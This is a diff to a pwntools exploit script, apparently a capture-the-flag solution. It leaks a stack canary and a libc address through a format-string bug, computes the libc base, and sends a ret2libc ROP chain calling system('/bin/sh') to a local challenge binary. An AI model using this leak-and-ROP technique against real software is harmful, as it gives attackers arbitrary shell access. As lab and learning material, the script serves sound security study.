@@ -7,13 +7,19 @@ libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 
 rop_elf = ROP(elf)
 
+IP = "localhost"
+PORT = 1337
+
 gs = '''
+break strategical_aproach
 continue
 '''
 
 def start():
     if args.GDB:
         return gdb.debug(elf.path, gdbscript=gs)
+    elif args.REMOTE:
+        return remote(IP, PORT)
 
     return process(elf.path)
 
@@ -36,15 +42,20 @@ def get_shell(data):
 
 p = start()
 
-# No aslr so glibc static!
-libc.address = 0x00007ffff7ddf000
-
 # Automate the canary leak:
-#for i in range(0, 50):
+# for i in range(0, 50):
 #    print(leak(b"%" + str(i).encode() + b"$p") + b" " + str(i).encode())
 
 canary = int(leak(b"%9$p"), 16)
+libc_leak = int(leak(b"%3$p"), 16)
+
 log.info(f"The canary: {hex(canary)}")
+log.info(f"The libc leak: {hex(libc_leak)}")
+
+# Calculate the libc start base. The leak's offset 
+# from the libc start address is always equal to 0xec833
+libc.address = libc_leak - 0xec833
+log.info(f"The libc @: {hex(libc.address)}")
 
 set_flag(b"tsiou,tsiou")
 
@@ -53,7 +64,7 @@ pop_rdi = p64(rop_elf.find_gadget(['pop rdi', 'ret'])[0])
 binsh = p64(next(libc.search(b"/bin/sh\x00")))
 system = p64(libc.sym.system)
 
-payload = b"a"*72 + p64(canary) + ret + pop_rdi + binsh + system
+payload = b"a"*64 + p64(canary) + ret + pop_rdi + binsh + system
 
 get_shell(payload)
 
